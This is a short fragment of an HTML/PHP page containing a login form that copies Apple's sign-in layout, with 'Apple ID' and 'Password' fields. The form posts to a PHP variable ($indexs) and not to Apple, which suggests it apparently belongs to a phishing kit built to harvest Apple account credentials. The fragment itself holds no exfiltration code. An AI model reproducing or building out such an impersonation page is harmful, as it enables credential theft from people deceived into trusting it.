                                        ...
                                        <form autocomplete="off" method="post" class="sign-in" action="<?php echo $indexs ?>" id="sign-in-form">
                                            ...
                                            <p>
                                                <span class="field-with-placeholder">
                                                    ...
                                                    <input type="email" id="login-appleId" class="login" maxlength="128" size="30" name="id" aria-invalid="false" required  value="" placeholder="Apple ID">
                                                </span>
                                                <span class="field-with-placeholder">
                                                   <!-- <label class="placeholder" for="login-password">
                                                        <span style="" id="password-label">Password</span>
                                                    </label> -->
                                                    <input type="password" id="login-password" value="" class="password" maxlength="32" size="30" name="password" aria-invalid="false" required placeholder="Password">
                                                </span>
                                            </p>
